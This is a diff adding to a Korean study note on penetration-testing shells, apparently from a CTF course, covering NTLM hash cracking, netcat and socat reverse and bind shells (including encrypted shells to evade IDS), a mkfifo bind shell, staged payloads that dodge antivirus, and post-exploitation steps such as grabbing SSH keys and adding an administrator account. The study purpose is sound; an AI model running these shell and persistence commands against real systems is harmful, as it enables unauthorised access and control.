@@ -278,4 +278,188 @@ ntlm hashdump 는 meterpreter 에서 hashdump 를 했을 때 windows target 에�
 `jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::`
 여기서 69596으로 시작하는 Hash
 
+아마도 레인보우 테이블 공격(Rainbow Table Attack) 으로 동작하는 것으로 보임. 미리 hash-cleartext 테이블을 구축해뒀을 것. 
+NTLMv2 처럼 salt 가 적용된 hash 에는 효과적이지 않다고 함. 
+
+NTLM 이란 
+
+Windows New Technology LAN Manager (NTLM) 은 MS 가 제공하는 보안 프로토콜임. 지금은 kerberos 에 의해 대체되었다고 함. 
+user id 를 인증하고 그들의 동작의 integrity 와 confidentiality 를 보호하는 것임. 주 목적은 SSO tool 이었음. 
+
+https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/
+
+
+
+# Priviledge  escalation
+
+reverse shell ; 서버가 나에게 연결해서 만든 쉘
+서버가 연결하는 꼴이기 때문에 firewall rule 을 우회하기 위한 좋은 방식임. 
+그러나 단점은 internet 을 통해 shell 을 받을 때 네트워크 설정이 그 쉘을 받을 수 있어야함. 예를 들면 public domain 을 갖고있다든
+
+bind shell ; 서버는 포트 열고 기다리고 내가 연결해서 만든 쉘
+
+reverse shell 을 받기 위해 혹은 bind shell 을 보내기 위해 사용하는 다양한 툴들이 있음. 
+
+netcat ; Swiss Army Knife of networking. 모든 종류의 network interaction 을 직접 수행하는데 사용됨. 예를 들면, enumeration 동안 banner 잡기
+reverse shell 받기, remote port 에 연결하기.=> reverse shell/ bind shell 
+
+socat ; 고도화된 netcat 버전이라고 보면 됨. 모든 기능을 다 커버하면서 더 많은 걸 할 수 있음. 별 다른 수정 없이도 netcat shell 보다 더 안정적임. 
+그러니까 상위호환인셈. 
+문법은 더 어렵다. netcat 은 기본적으로 모든 리눅스 배포판에서 설치가 되어있는데 socat 은 거의 그렇지 않음. 
+
+
+netcat 으로 reverse shell 을 구축하는 방법은 아래와 같음
+```
+On the attacking machine:
+
+sudo nc -lvnp 443
+
+On the target:
+
+nc <LOCAL-IP> <PORT> -e /bin/bash
+```
+
+
+netcat shell 에 연결됐다 치고 다음은? 
+netcat 은 불안정해서 ctrl+c 만 눌러도 모든게 다 죽어버림. 
+이는 netcat shell 들이 실제로 터미널 속에서 실행되는 프로세스들이기 때문임. 딱히 진짜 터미널이라서 그런건 아님
+다행히 netcat shell 을 리눅스 시스템에서 안정화시킬 여러 방법들이 존재함. 
+
+그 방법 중 하나는 python 임. 
+
+기본적으로 다들 python 이 깔려있으므로 적용하기에 좋음. 
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+를 하면 python 이 더 좋은 기능의 bash shell 을 생성해준다. 
+물론 여전히 autocomplete 이나 arrow key 는 안먹힐거임. 그리고 ctrl+c 가 shell 을 죽이는 것도 마찬가지일거임. 
+
+다음 단계로 
+```
+export TERM=xterm --
+```
+를 하면 clear 같은 터미널 커맨드를 사용할 수 있게 된다. 
+
+마지막으로 가장 중요한, 
+shell 을 ctrl+z 로 백그라운드로 보낼 수 있다. 
+attacking machine 의 우리 터미널로 가서 
+```
+stty raw -echo; fg 
+```
+를 하면 우리 터미널의 Echo 를 끄게 된다. 이로서 victim terminal 에서의 tab autocomplete 과 arrow key, ctrl+c 가 가능해진다. 
+그다음에 fg 는 쉘로 붙는 것을 해줌. 
+
+사실 걍 이짓할 필요 없이 socat 쓰면 되는데 windows 에서는 socat 이 더 불안정하다는 소리도 있음. 
+
+Socat
+
+socat 의 뛰어난 것 중 하나는 암호화된 shell 을 생성할 수 있다는 것이다. bind/reverse shell 모두 가능하다. 
+왜 이런 짓을 하고싶을까? 암호화된 shell 은 복호화키 없이는 감청할 수 없다. 
+그 결과 IDS 를 우회할 수 있다. 
+
+encrypted shell 을 사용할 때는 TCP 로 사용된 커맨드는 openssl 로 대체되어야함. 
+그 전에 인증서에 대해서 말해보자
+
+encrypted shell 을 사용하려면 인증서를 생성할 필요가 있음. 
+이는 attacking machine 에서 매우 간단한 일
+
+
+```
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+
+이 커맨드는 2048 bit RSA key 와 그에 대응되는 인증서(cert file) 을 생성한다. 이 인증서는 스스로 서명했으며 1년 미만(362일)의 유효기간을 지닌다. 
+이 커맨드 실행하면 인증서에 대한 정보를 기입하라고 한다. 
+빈칸으로 두면 random으로 채워넣음. 
+그러고 나면 우리는 두개의 생성된 파일을 .pem 으로 합쳐야함. 
+
+```
+cat shell.key shell.crt > shell.pem
+```
+
+이제 reverse shell listener 를 만들었다면 이렇게 사용함
+
+```
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+```
+
+이 커맨드는 우리가 생성했던 인증서를 이용해서 OPENSSL listener 를 만든다. verify=0 의 의미는 
+connection 에게 우리 인증서가 적절히 recognised authority 에 의해 서명됐는지 검증하려고 하는 수고를 하지 말라는 의미다. 
+인증서는 어떤 device 가 listening 하고 있는지 상관없이 사용되어야한다는 것을 명심해라
+
+victim 이 connect 하는 거는 아래와 같음
+
+```
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+
+동일한 기술이 bind shell 에도 사용된다. 
+
+```
+Target:
+
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+Attacker:
+
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+```
+
+windows target 에도 역시나 인증서가 listener 에서 사용된다. 그래서 bind shell 이라면 PEM 파일을 복사해서 넘겨주는 작업이 필요하다. 
+
+
+windows 에서는 -e 옵션이 가능한 netcat 이 있는듯 함. 그런데 linux 에서는 -e option 이 거세된 netcat 이 있을 때가 있음. 
+이러면 다음과 같은 방법이 가능함. 
+
+```
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+named pipe 를 만드는 mkfifo 를 이용해서 우회가 가능한 셈. 
+named pipe /tmp/f 를 만들고 netcat listener 를 시작함. 그리고는 listener 의 input 을 named pipe 의 output 에 연결.
+netcat listener 의 output (우리가 보낸 커맨드) 는 pipe 로 sh 에 보냄. 그리고 stderr output stream 을 stdout 에도 보냄. 
+그리고 stdout 은 named pipe 에 보냄. 
+named pipe -(클라이언트에게 보낼 것)-> nc listener -(클라이언트에게서 받아온것)-> sh -> named pipe
+
+
+
+이제 msfvenom 을 다시 보자
+
+여기에 두 컨셉이 있는데
+Staged vs Stageless
+
+staged payloads 는 두 단계에 걸쳐서 보내진다. 첫 부분은 stager 라 불리는 것. server 에서 직접적으로 실행되는 코드 조각
+이 코드(stager) 는 기다리고 있는 listener 에게 연결을 하는데 어떤 reverse shell code 를 가지고 있지 않다. 
+그 대신 listener 에게 연결하고 그 연결로 진짜 payload 를 받아와서 올리는 역할을 한다. 
+traditional anti-virius solution 이 disk 를 건드려서 실행하는 애들을 검사하기 때문에 이를 피할 수 있는 효과가 있다. 
+그래서 payload 는 두 부분으로 나뉜다. 작은 부분이 초기 stager, 더 큰 쪽이 reverse shell code 로 stager 가 활성화 되면 다운로드 하게 되는 녀석이다. 
+staged payload 는 특별한 listener 가 필요함. 주로 Metasploit multi/handler 임. 
+
+Stageless payload 는 더 사용하기도 쉽고 잡히기도 쉬움. staged payload 는 사용하기에 어렵지만 initial stager 는 더 짧고 종종 구린 antivirus 가 잡을 수 없다. 
+요즘 antivirius solution 은 AMSI(Anti-Malware Scan Interface) 를 사용해서 payload 를 잡아낼거임. 왜냐면 결국 payload 는 stager 에 의해 메모리에 올라갈 것이기 때문. 
+
+
+
+자 이제 shell 을 탈취했다고 치자. 그 다음엔 뭘 해야하는가? 
+
+We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?
+
+On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at /home/<user>/.ssh are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
+
+On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
+ or C:\xampp\FileZilla Server\FileZilla Server.xml
+. These can be MD5 hashes or in plaintext, depending on the version.
+
+Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
+
+The syntax for this is as follows:
+
+net user <username> <password> /add
+
+net localgroup administrators <username> /add
+
+The important take away from this task:
+
+Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
 
